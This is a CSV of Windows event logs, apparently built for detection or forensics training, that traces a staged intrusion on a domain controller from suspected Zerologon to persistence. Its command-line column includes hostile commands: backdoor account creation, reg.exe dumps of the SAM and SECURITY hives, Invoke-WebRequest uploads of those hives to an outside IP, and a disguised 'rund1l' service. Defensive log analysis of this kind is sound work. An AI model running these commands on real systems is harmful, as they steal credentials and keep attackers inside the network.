timestamp,hostname,username,event_type,event_id,process,command_line,source_ip,destination_ip,file_path,registry_path,description
2026-01-14T01:03:12Z,DC01$,SYSTEM,Security,4742,lsass.exe,,10.10.5.23,10.10.5.10,,,"Potential Zerologon exploitation attempt — multiple failed machine account password resets"
2026-01-14T01:03:15Z,DC01$,SYSTEM,Security,4742,lsass.exe,,10.10.5.23,10.10.5.10,,,"Machine account password changed without proper authentication — Zerologon success suspected"
2026-01-14T01:04:01Z,DC01,Administrator,ProcessCreate,4688,cmd.exe,cmd.exe /c net user supportsvc P@ssw0rd! /add,10.10.5.23,10.10.5.10,,,"Creation of new local user account supportsvc"
2026-01-14T01:04:05Z,DC01,Administrator,Security,4720,lsass.exe,,10.10.5.23,10.10.5.10,,,"User account supportsvc created"
2026-01-14T01:04:30Z,DC01,Administrator,ProcessCreate,4688,cmd.exe,cmd.exe /c net localgroup administrators supportsvc /add,10.10.5.23,10.10.5.10,,,"Added supportsvc to local administrators group"
2026-01-14T01:06:10Z,DC01,Administrator,FileCreate,11,anydesk.exe,anydesk.exe --install "C:\Program Files\AnyDesk",10.10.5.23,10.10.5.10,C:\Program Files\AnyDesk\AnyDesk.exe,,"AnyDesk remote access tool installed"
2026-01-14T01:07:01Z,DC01,supportsvc,NetworkConnect,3,AnyDesk.exe,,10.10.5.10,45.77.33.10,,,"AnyDesk outbound remote session initiated"
2026-01-14T01:08:42Z,DC01,supportsvc,ProcessCreate,4688,reg.exe,reg.exe save HKLM\SAM C:\Temp\SAM.hive,10.10.5.10,10.10.5.10,C:\Temp\SAM.hive,,"Saved SAM hive to disk"
2026-01-14T01:08:50Z,DC01,supportsvc,ProcessCreate,4688,reg.exe,reg.exe save HKLM\SECURITY C:\Temp\SECURITY.hive,10.10.5.10,10.10.5.10,C:\Temp\SECURITY.hive,,"Saved SECURITY hive to disk"
2026-01-14T01:09:30Z,DC01,supportsvc,NetworkSend,5156,powershell.exe,Invoke-WebRequest -Uri http://45.77.33.10/upload -InFile C:\Temp\SAM.hive,10.10.5.10,45.77.33.10,C:\Temp\SAM.hive,,"Exfiltration of SAM hive"
2026-01-14T01:09:35Z,DC01,supportsvc,NetworkSend,5156,powershell.exe,Invoke-WebRequest -Uri http://45.77.33.10/upload -InFile C:\Temp\SECURITY.hive,10.10.5.10,45.77.33.10,C:\Temp\SECURITY.hive,,"Exfiltration of SECURITY hive"
2026-01-14T01:10:12Z,DC01,supportsvc,RegistrySet,13,rund1l.exe,,10.10.5.10,10.10.5.10,,HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\rund1l,"Persistence via RunOnce registry key"
2026-01-14T01:10:45Z,DC01,supportsvc,ServiceInstall,7045,sc.exe,sc create rund1l binPath= "C:\Windows\System32\rund1l.exe" start= auto,10.10.5.10,10.10.5.10,C:\Windows\System32\rund1l.exe,,"Malicious service installed for persistence"
2026-01-14T01:11:00Z,DC01,SYSTEM,ServiceStart,7036,rund1l.exe,,10.10.5.10,10.10.5.10,C:\Windows\System32\rund1l.exe,,"Malicious service rund1l started"
